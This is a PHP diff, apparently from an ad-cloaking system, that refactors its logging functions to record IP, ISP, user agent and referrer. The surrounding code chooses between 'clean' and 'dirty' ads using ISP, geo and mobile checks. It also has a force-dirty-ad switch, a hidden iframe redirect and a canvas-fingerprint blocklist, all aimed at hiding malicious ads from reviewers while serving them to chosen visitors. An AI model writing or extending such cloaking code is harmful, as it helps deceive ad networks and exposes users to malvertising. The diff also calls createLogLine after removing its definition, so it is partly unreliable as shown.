@@ -141,33 +141,26 @@
 		return $resultHtml;
 	}
 
-	function adlog($campaignID, $txt)
+	function adlog($campaignID, $ip, $isp, $txt)
 	{
+		$line = createLogLine($ip, $isp, $txt);
 		$f = fopen("logs/adlog.$campaignID.log","a");
-		fwrite($f,date("m.d.y H:i:s") . ": " . $_SERVER['REMOTE_ADDR'] . "(" . $_SERVER['HTTP_USER_AGENT'] . "): " . $txt . " \n");
+		fwrite($f, $line);
 		fclose($f);
-	}
-
-	function createLogLine($campaignID, $ip, $isp, $txt)
-	{
-		$referrer = array_key_exists('HTTP_REFERER', $_SERVER) ? $_SERVER['HTTP_REFERER'] : "Unknown";
-		$line = "Date," . date("Y-m-d H:i:s") . ",IP," . $ip . ",ISP," . $isp . ",UserAgent," . $_SERVER['HTTP_USER_AGENT'] . ",SERVER Referrer," . $referrer . ",QueryString," . $_SERVER['QUERY_STRING'] . ",Message," . $txt . "\n";
-
-		return $line;		
 	}
 
 	function mbotlog($campaignID, $ip, $isp, $txt)
 	{
-		$line = createLogLine($campaignID, $ip, $isp, $txt);
-		$f = fopen("logs/mbotlog.$campaignID.log","a");
+		$line = createLogLine($ip, $isp, $txt);
+		$f = fopen("logs/mbotlog.$campaignID.log", "a");
 		fwrite($f, $line);
 		fclose($f);
 	}
 
 	function allowedTrafficLog($campaignID, $ip, $isp)
 	{
-		$line = createLogLine($campaignID, $ip, $isp, "");
-		$f = fopen("logs/allowed_traffic.$campaignID.log","a");
+		$line = createLogLine($ip, $isp, "");
+		$f = fopen("logs/allowed_traffic.$campaignID.log", "a");
 		fwrite($f, $line);
 		fclose($f);
 	}
@@ -237,7 +230,7 @@
 
 	if ($loggingEnabled)
 	{
-		adlog($campaignID,
+		adlog($campaignID, $ip, $isp['isp'],
 			'ip:"'.$ip.'",'.
 			'isp:"'.$isp['isp'].'",'.
 			'city:"'.$geo['city'].'",'.
@@ -340,7 +333,7 @@
 
 		if ($loggingEnabled)
 		{
-			adlog($campaignID, "UserAgent is not a mobile device.");
+			adlog($campaignID, $ip, $isp['isp'], "UserAgent is not a mobile device.");
 		}
 	}
 	elseif (!$serveCleanAd && $ispCloakingEnabled)
@@ -364,7 +357,7 @@
 
 			if ($loggingEnabled)
 			{
-				adlog($campaignID, "ISP/Geo is allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
+				adlog($campaignID, $ip, $isp['isp'], "ISP/Geo is allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
 			}
 		}
 		else
@@ -373,7 +366,7 @@
 
 			if ($loggingEnabled)
 			{
-				adlog($campaignID, "ISP/Geo is NOT allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
+				adlog($campaignID, $ip, $isp['isp'], "ISP/Geo is NOT allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
 			}
 		}
 	}
@@ -418,7 +411,7 @@
 	{
 		if ($loggingEnabled && !$redirectEnabled)
 		{
-			adlog($campaignID, "Redirect disabled.");
+			adlog($campaignID, $ip, $isp['isp'], "Redirect disabled.");
 		}
 
 		if ($trackingPixelEnabled && !empty($trackingPixelUrl))
@@ -449,7 +442,7 @@
 
 			if ($forceDirtyAd)
 			{
-				adlog($campaignID, "Force Dirty Ad enabled.");
+				adlog($campaignID, $ip, $isp['isp'], "Force Dirty Ad enabled.");
 			}
 		}
 
@@ -488,7 +481,7 @@
 
 		if ($loggingEnabled)
 		{
-			adlog($campaignID, $redirectUrl);
+			adlog($campaignID, $ip, $isp['isp'], $redirectUrl);
 		}
 
 		$hiddeniFrameRedirect = "var el = document.createElement('iframe');
@@ -564,11 +557,11 @@
 
 							if (result)
 							{
-								jslog('canvasFingerPrint: ' + canvasFingerPrint + ' in blocked list.');
+								jslog('CanvasFingerprint: ' + canvasFingerPrint + ' in blocked list.');
 							}
 							else
 							{
-								jslog('canvasFingerPrint: ' + canvasFingerPrint + ' NOT in blocked list.');
+								jslog('CanvasFingerprint: ' + canvasFingerPrint + ' NOT in blocked list.');
 							}
 
 							return result;
